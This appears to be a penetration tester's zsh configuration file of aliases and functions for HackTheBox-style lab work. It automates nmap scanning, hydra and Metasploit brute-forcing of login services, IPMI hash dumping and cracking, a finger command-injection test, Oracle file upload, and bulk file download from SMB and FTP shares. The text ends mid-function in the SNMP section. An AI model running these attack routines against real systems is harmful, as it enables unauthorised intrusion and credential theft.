#Program aliases
alias htb='sudo openvpn /home/damuna/Downloads/lab_Damuna.ovpn'
alias academy='sudo openvpn /home/damuna/Downloads/academy-regular.ovpn'
alias tunip="ip -o -4 addr show tun0 | awk '{print \$4}' | cut -d'/' -f1"
alias gettgtpkinit.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/gettgtpkinit.py"
alias pygpoabuse="/home/damuna/TOOLS/pyGPOAbuse/venv/bin/python3 /home/damuna/TOOLS/pyGPOAbuse/pygpoabuse.py"
# TTY upgrade
tty(){
    echo "script -qc /bin/bash /dev/null \n python3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=xterm \n xterm for teminal type"
}

# TCP / UDP Port Scanners
portscan() {
  dom=$(openssl rand -hex 4)
  tmux new-session -d -s $dom -n "$1" "source ~/.zshrc; tcp $1; read"
  tmux split-window -v -t $dom "source ~/.zshrc; udp $1; read"
  tmux select-layout -t $dom main-vertical
  tmux resize-pane -t $dom -x 50%
  tmux attach -t $dom
}

tcp(){
    echo -e "\nTCP (TOP-3000) OPEN SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 3000 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nTCP (TOP-99%) OPEN SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 8377 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nTCP (FULL) SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v -p- --reason $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nNUCLEI NETWORK SCAN\n"
    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
    nuclei -u $1 -t network/
}

udp(){
    echo -e "\nUDP SERVICE SCANNING (TOP 100)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 100 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP SERVICE SCANNING (TOP 99%)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v  --top-ports 15094 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never --color=never

    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP FULL BACKGROUND SCANNING\n"
    sudo nmap -sU -n -Pn --disable-arp-ping  -g 53 -v -p- --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" --color=never

    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt
}


nscan(){
    echo "protocol (t/u): ";read protocol
    echo "service name: ";read service
    
    flag=""
    if [[ "$protocol" == "t" ]]; then
        flag="-sSV"
    fi
    if [[ "$protocol" == "u" ]]; then
        flag="-sUV"
    fi
    script_arg="$service-* and not brute"
    
    local server="$1"
    sudo nmap $flag -n -Pn --disable-arp-ping -v -p$2 "$server" --script="$script_arg"
    
    if [[ $1 == "rdp" ]]; then
        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RPORT $2; set RHOSTS $1; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $2; set RHOSTS $1; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; set RPORT $2; set RHOSTS $1; exploit; exit"

        read creds\?"INPUT VALID \"USER:PASS\" COMBO IF FOUND: "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING LOGIN\n"
            xfreerdp /u:$usr /p:"$psw" /v:$1
        fi
    fi
    if [[ $service == "rexec" ]];then
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi

        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi

        echo -e "\nTESTING WEAK CREDENTIALS\n"
        hydra -L $wd_user -P $wd_pass rexec://$1:$2 -v -V

        echo -e "\nMSF BRUTEFORCING\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rexec_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set PASS_FILE $wd_pass; set RPORT $2; set RHOSTS $1; exploit; exit"
    fi

    if [[ $service == "rlogin" ]];then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="rlogin-brute" -p$2 $1

        echo -e "\nTESTING ROOT AUTHENTICATION\n"
        rlogin $1 -l root

        echo -e "\nTESTING WEAK CREDENTIALS\n"
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi

        hydra -L $wd_user -P $wd_pass rlogin://$1:$2 -v -V
        echo -e "\nMSF BRUTEFORCING\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rlogin_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set PASS_FILE $wd_pass; set RPORT $2; set RHOSTS $1; exploit; exit"
    fi

    if [[ $service == "rsh" ]];then

        echo -e "\nMSF BRUTEFORCING\n"
        
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi
        msfconsole -q -x "use auxiliary/scanner/rservices/rsh_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set PASS_FILE $wd_pass; set RPORT $2; set RHOSTS $1; exploit; exit"

        echo -e "\nENUMERATING VALID USERS\n"
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        hydra -L $wd_user rsh://$1:$2 -v -V
    fi

    if [[ $service == "ssh" ]];then
        echo -e "\nLAUNCHING SSH-AUDIT\n"
        ssh-audit --port $2 $1
    
        read resp\?"DO YOU WANT TO TEST WEAK CREDENTIALS? (Y/N)"
        if [[ $resp =~ ^[Yy]$ ]]; then
            vared -p "INPUT THE WORDLIST (leave empty to use ssh-betterdefaultpasslist): " -c wordlist
            if [[ -z $wordlist ]]; then
                wordlist="/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt"
            fi
            hydra -V -t 8 -e nsr -f -C $wordlist ssh://$1:$2
        fi

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set USER_FILE /usr/share/seclists/Usernames/cirt-default-usernames.txt; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/fortinet_backdoor; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/eaton_xpert_backdoor; set RHOSTS $1; set RPORT $2; exploit; exit"
    fi

    if [[ "$service" == "ipmi" ]];then
        echo "\n---------METASPLOIT ENUM \n"
        msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version; set rhosts $1; set rport $2; run; exit"

        echo -e "\n-------------CHECKING ANONYMOUS AUTHENTICATION\n"
        ipmitool -I lanplus -H $1 -U '' -P '' user list

        echo -e "\nCHECKING CIPHER ZERO\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $1; set RPORT $2; exploit; exit"
        ipmitool -I lanplus -C 0 -H $1 -U root -P root user list 

        echo "\n----------METASPLOIT HASH DUMPING\n"
        msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts $1; set rport $2; set output_john_file /tmp/out.john; set output_hashcat_file /tmp/out.hashcat; run; exit"
        
        vared -p "INPUT THE WORDLIST FOR HASH CRACKING (leave empty to use rockyou): " -c wordlist
        if [[ -z $wordlist ]]; then
            wordlist="/usr/share/wordlists/rockyou.txt"
        fi
        john --wordlist=$wordlist --fork=15 --session=ipmi --rules=Jumbo --format=rakp /tmp/out.john

        echo "Try bruteforcing the hash? (y/)";read ans
        if [[ $ans == "y" ]];then
            john --fork=8 --incremental:alpha --format=rakp ~/output/out.john
            echo "\nTry hashcat with 4 chars? (y/n)";read ans4
            if [[ "$ans4" == "y" ]];then
                hashcat --username -m 7300 out.hashcat -a 3 ?a?a?a?a
            fi
            echo "\nTry hashcat with 8 chars? (y/n)";read ans8
            if [[ "$ans8" == "y" ]];then
                hashcat --username -m 7300 out.hashcat -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
            fi
        fi
        
        echo -e "\nUPNP LISTENER UDP 1900 -> \"use exploit/multi/upnp/libupnp_ssdp_overflow\"\n"
    fi

    if [[ "$service" == "oracle" ]];then
        echo "\n ------ODAT----------------\n"
        odat.py all -s $1

        echo "\nTesting file upload? You need credentials (y/n)?"; read answer
        if [[ "$answer" == "n" ]]; then
            echo "Exiting the function."
            exit 1 
        fi
        echo "\n\nEnter a valid SID: ";read sid
        echo "\nEnter username: ";read user
        echo "\nEnter password: ";read passwd
        echo "\nWindows or Linux (w/l/empty to costum dir location)?"; read os
        
        if [[ $os == "w" ]];then
            dir="C:\\inetpub\\wwwroot"
        fi
        if [[ $os == "l" ]];then
            dir="/var/www/html"
        fi
        if [[ $os == "" ]];then
            echo "\nSpecify dir to upload the file";read dir
        fi
        
        echo "Oracle File Upload Test" > testing.txt
        ./odat.py utlfile -s $1 -d $sid -U $user -P $passwd --sysdba --putFile $dir testing.txt ./testing.txt
        curl -X GET http://$1/testing.txt	

    fi

    if [[ "$service" == "ms-sql" ]];then
        #Try default credentials in nmap script
        echo "\nTRYING NMAP WITH DEFAULT CREDENTIALS\n"
        sudo nmap -n -Pn -v --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=$2,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p$2 $1
        #MSSQL Ping in Metasploit
        echo "\nMETASPLOIT ENUM \n"
        msfconsole -x "use auxiliary/scanner/mssql/mssql_ping; set rhosts $1; run; exit"
        echo -e "\nTESTING WEAK CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt mssql://$1:$2
    fi

    if [[ "$service" == "rpc" ]]; then
	    echo -e "\nTRYING NULL/GUEST BINDINGS\n"
        rpcclient -U "" -N $1
    	rpcclient -U "%" -N $1
        rpcclient -U "Guest" -N $1

        echo -e "\nCHECKING IOXID INTERFACES/IPs\n"
        /home/damuna/TOOLS/IOXIDResolver/venv/bin/python3 ~/TOOLS/IOXIDResolver/IOXIDResolver.py -t $1
    fi

    if [[ "$service" == "finger" ]]; then
        echo -e "\nGRABBING ROOT BANNER\n"
        echo root | nc -vn $1 $2

        echo -e "\nTESTING \"/bin/id\" INJECTION\n"
        finger "|/bin/id@$1"

        echo -e "\nENUMERATING USERS (XATO-TOP-1000)\n"
        msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $1; set RPORT $2; set USERS_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt; exploit; exit"
    fi
    
    if [[ "$service" == "ldap" ]]; then
        echo -e "\nTESTING NULL BINDS\n"
        nxc ldap $1 --port $2 -u '' -p ''
        ldapsearch -H ldap://$1:$2 -x -s base namingcontexts
    fi
    
    if [[ "$service" == "dns" ]]; then        
        read -r ad_resp\?"IS THE DNS SERVER HANDLING AN ACTIVE DIRECTORY? (Y/N): "

	    while true; do
        	read -r dnsdom\?"INPUT A DOMAIN TO ENUMERATE (CTRL-C TO EXIT): "
        	if [[ ! -z $dnsdom ]]; then
                    rm /tmp/ns_$dnsdom.txt /tmp/zones_$dnsdom.txt &>/dev/null
                    if [[ $ad_resp =~ [Yy] ]]; then
                        echo -e "\nCHECKING AD RECORDS WITH DIG\n"
                        dig -t _gc._tcp.lab.$dnsdom @$1 -p$2
                        dig -t _ldap._tcp.lab.$dnsdom @$1 -p$2
                        dig -t _kerberos._tcp.lab.$dnsdom @$1 -p$2
                        dig -t _kpasswd._tcp.lab.$dnsdom @$1 -p $2

                        echo -e "\nCHECKING NMAP SRV-ENUM RECORDS\n"
            		    sudo nmap -Pn -n -sUV -p$2 --script dns-srv-enum --script-args dns-srv-enum.domain=$dnsdom $1
                    fi

                    echo -e "\nREQUESTING \"NS\" RECORDS FOR \"$dnsdom\"\n"
                    ns_records=$(dig ns $dnsdom @$1 -p $2 +short) && echo $ns_records
                    ref_chk=$(dig ns $dnsdom @$1 -p $2 | grep REFUSED)

                    if [[ ! -z $ref_chk || -z $ns_records ]]; then
                        echo -e "\nREQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig a $dnsdom @$1 -p $2 +short
                        dig aaaa $dnsdom @$1 -p $2 +short

                        echo -e "\nREQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig mx $dnsdom @$1 -p $2 +short
                        dig txt $dnsdom @$1 -p $2 +short

                        echo -e "\nREQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig cname $dnsdom @$1 -p $2 +short

                        if [[ ! -z $ns_records ]]; then
                            echo -e "NS REQUEST WAS REFUSED, ATTEMPTING ZONE TRANSFER OVER DNS IP\n"
                            axfr_resp=$(dig axfr $dnsdom @$1 -p $2 | grep $dnsdom --color=never | tail -n +2)

                            if [[ -z $axfr_resp ]]; then
                                echo -e "\nZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                                echo $1 > /tmp/ns_$dnsdom.txt
                                cur=$(pwd) && cd ~/TOOLS/subbrute
                                python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                cd $cur
                            else
                                echo $axfr_resp
                            fi
                        fi
                    fi

                    if [[ ! -z $ns_records && -z $ref_chk ]]; then
                        echo $ns_records > /tmp/zones_$dnsdom.txt && touch /tmp/ns_$dnsdom.txt
                        while read zone; do
                            ip_chk=$(dig a ${zone%.} @$1 +short)
                            if [[ $ip_chk == "127.0.0.1" || -z $ip_chk ]]; then 
                                echo $1 >> /tmp/ns_$dnsdom.txt
                            else
                                echo $ip_chk >> /tmp/ns_$dnsdom.txt
                            fi
                        done < /tmp/zones_$dnsdom.txt
                        cat /tmp/ns_$dnsdom.txt | sort -u > /tmp/tmp_ns_$dnsdom.txt && mv /tmp/tmp_ns_$dnsdom.txt /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig a $dnsdom @$zone -p $2 +short
                            dig aaaa $dnsdom @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig mx $dnsdom @$zone -p $2 +short
                            dig txt $dnsdom @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig cname $dnsdom @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nATTEMPTING ZONE TRANSFER OVER ALL ZONES\n"
                        while read zone; do
                            axfr_resp=$(dig axfr $dnsdom @$zone -p $2 | grep $dnsdom --color=never | tail -n +2)
                            if [[ ! -z $axfr_resp ]]; then
                                echo $axfr_resp
                                break
                            fi
                        done < /tmp/ns_$dnsdom.txt
                        if [[ -z $axfr_resp ]]; then
                            echo -e "\nZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                            cur=$(pwd) && cd ~/TOOLS/subbrute
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                            cd $cur
                        fi
                    fi
        	fi
	    done

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $1; set RPORT $2; exploit; exit"
    fi

    if [[ "$service" == "nfs" ]]; then
        echo "Available NFS shares on $1:"
        showmount -e "$1"
        echo -e "\nMOUNT SHARES -> \"mkdir /tmp/nfs && sudo mount -o nolock -t nfs $1:[SHARE] /tmp/nfs_mount\"\n"
    fi
    
    if [[ "$service" == "smtp" ]]; then
        vared -p "INPUT THE WORDLIST FOR BRUTEFORCING (leave empty to use default): " -c wordlist

        if [[ -z $wordlist ]]; then
            wordlist="/usr/share/seclists/Usernames/Names/names.txt"
        fi

        echo -e "\nTELNET BANNER GRAB\n"
        echo "exit" | telnet $1 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $1; set RPORT $2; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS $1; set RPORT $2; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $1; set RPORT $2; run; exit" 

        echo -e "\nMSF AUTO USER ENUMERATION ( VRFY, EXPN, or RCPT )\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $1; set RPORT $2; set USER_FILE $wordlist; run; exit"

        read mtd\?"INPUT METHOD FOR USER ENUMERATION: "
        read dom\?"INPUT A DOMAIN IF PRESENT: "
        if [[ ! -z $dom ]]; then
            smtp-user-enum -M $mtd -U $wordlist -t $1 -p $2 -w 15 -D $dom
        else
            smtp-user-enum -M $mtd -U $wordlist -t $1 -p $2 -w 15
        fi 
        
        read user\?"INPUT A USER IF FOUND ( with @domain!!! ): "
        if [[ ! -z $user ]]; then
            hydra -l $user -P /usr/share/seclists/Passwords/darkweb2017-top100.txt smtp://$1:$2 -S -v -V
        else
            hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt smtp://$1:$2 -S -v -V
        fi 
    fi
    
    if [[ $service == "pop3" ]]; then
        echo -e "\n------------BANNER GRABBING\n"
        echo "quit" | nc -vn $1 $2

        read pop3s\?"INPUT A POP3 TLS PORT IF PRESENT: "
        if [[ ! -z $pop3s ]]; then
            echo -e "\n---------------GRABBING CERTIFICATE\n"
            echo "Q" | openssl s_client -connet $1:$pop3s -crlf -quiet
        fi 

        echo -e "\n------------TESTING WEAK CREDENTIALS (CIRT / DEFAULT-PASS)\n"
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi
        hydra -L $wd_users -P $wd_pass -f $1 -s $2 pop3 -V
    
        echo -e "\n------------MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/pop3/pop3_version; set RHOSTS $1; set RPORT $2; exploit; exit"

        read cred\?"INPUT VALID \"USER:PASS\" COMBO IF FOUND: " 
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)
           
            echo -e "\nLISTING MESSAGES\n"
            curl -u "$usr:$psw" -s pop3://$1:$2

            while true; do read msg\?"INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$1:$2/$msg; done
        fi

    fi

    if [[ $service == "imap" ]]; then
        echo -e "\n----------------MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/imap/imap_version; set RHOSTS $1; set RPORT $2; exploit; exit"

        read imaps\?"INPUT A IMAP TLS PORT IF PRESENT: "
        if [[ ! -z $imaps ]]; then
            echo -e "\nGRABBING CERTIFICATE\n"
            echo "Q" | openssl s_client -connect $1:$2 -quiet
        fi

        echo -e "\n-------------------TESTING WEAK CREDENTIALS (CIRT / DEFAULT-PASS)\n"

        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi
        hydra -L $wd_user -P $wd_pass -s $2 -f -V imap://$1/PLAIN

        read cred\?"INPUT VALID \"MAIL:PASS\" COMBO IF FOUND : "
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)

            echo -e "\nLISTING MAILBOXES\n"
            curl -u "$usr:$psw" imap://$1:$2 -X 'LIST "" "*"'

            while true; do read mailbox\?"INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$1:$2/$mailbox && read index\?"INPUT MAIL UID TO READ (1 for first email ...): " && curl -u "$usr:$psw" "imap://$1:$2/$mailbox;UID=$index"; done
        fi

    fi

    if [[ "$service" == "ftp" ]]; then
        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -e nsr -f -t 4 -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$1:$2

        read -r ans\?"\n\nBRUTE FORCING? (y/n)?"
        if [[ $ans!="n" ]]; then
            vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use xato): " -c wd_user
            if [[ -z $wd_user ]]; then
                wd_users="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
            fi
            vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default xato): " -c wd_pass
            if [[ -z $wd_pass ]]; then
                wd_pass="/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"
            fi
            hydra -V -e nsr -f -L $wd_users -P $wd_pass ftp://$1:$2
        fi

        read -r creds\?"\nINPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            read -r resp\?"DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$1_FTP\"? (Y/N)"
            if [[ $resp =~ [Yy]$ ]]; then
                echo -e "\nDOWNLOADING FILES\n"
                mkdir ./$1_FTP && cd ./$1_FTP && wget --mirror --user="$usr" --password="$psw" --no-passive-ftp ftp://$1:$2
                cd ..
            fi
        fi
    fi

    if [[ "$service" == "smb" ]]; then
        echo -e "\nTRYING NULL/GUEST BINDINGS\n"
        nxc smb $1 -u '' -p '' --port $2
        nxc smb $1 -u 'Guest' -p '' --port $2
        nxc smb $1 -u '' -p '' --local-auth --port $2
        nxc smb $1 -u 'Guest' -p '' --local-auth --port $2

        read -r resp\?"DO YOU WANT TO CHECK DEFAULT CREDENTIALS? (Y/N): "
        if [[ $resp =~ [Yy] ]]; then
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt smb://$1:$2
        fi

        echo -e "\nMSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $1; set RPORT $2; exploit; exit" 
        
        while true; do
            read -r respenu?"\nDO YOU HAVE CREDENTIALS FOR nxc? (y/n): "
    
            if [[ $respenu == "n" ]]; then
                break
            fi
    
            read -r user?"\nUSERNAME: "
            read -r pass?"\nPASSWORD: "
        
            echo -e "\nPASSWORD POLICY\n"
            nxc smb "$1" -u "$user" -p "$pass" --port "$2" --pass-pol

            echo -e "\nCVE SEARCH (AD)"
            nxc smb "$1" -u "$user" -p "$pass" --port "$2" -M ms17-010 -M smbghost -M zerologon -M nopac -M printnightmare -M remove-mic
        
            echo -e "\nDOWNLOAD POSSIBLE FILES\n"
            nxc smb "$1" -u "$user" -p "$pass" --port "$2" -M spider_plus -o DOWNLOAD_FLAG=True
        done
    fi

    if [[ $1 == "irc" ]]; then
        echo -e "\nATTEMPTING ANONYMOUS CONNECTION TO THE IRC AS \"test_user\"\n"
        irssi -c $1 -p $2 -n test_user
    
    fi

    if [[ "$service" == "snmp" ]]; then

        read snmp_ver\?"INPUT SNMP VERSION (1, 2c, 3): "

        if [[ $snmp_ver == "3" ]]; then
            echo -e "\nPERFORMING USER BRUTEFORCING (CIRT / DARKWEB)\n"
            vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
            if [[ -z $wd_user ]]; then
                wd_user="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
            fi
            vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
            if [[ -z $wd_pass ]]; then
                wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
            fi
            ~/TOOLS/snmpwn/snmpwn.rb -u $wd_user -p $wd_pass --enclist $wd_pass -h $1:$2
            
            echo ""; read snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
            usr=$(echo $snmp_data | cut -d':' -f1)
            pass=$(echo $snmp_data | cut -d':' -f2)

            read snmp_os\?"INPUT OPERATING SYSTEM (lin, win): "
            if [[ $snmp_os == "win" ]]; then
                echo -e "\nEXTRACING USERS\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.4.1.77.1.2.25

                echo -e "\nEXTRACTING PROCESSES\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.2.1.25.4.2.1.2

                echo -e "\nEXTRACTING INSTALLED SOFTWARE\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.2.1.25.6.3.1.2

                echo -e "\nEXTRACING LOCAL PORTS\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.2.1.6.13.1.3
            fi
            # If Linux or Windows
            echo -e "\nDUMPING MIB STRINGS IN \"$1_SNMPWALK.txt\"\n"
            snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $1_SNMPWALK.txt
            
            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $1_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
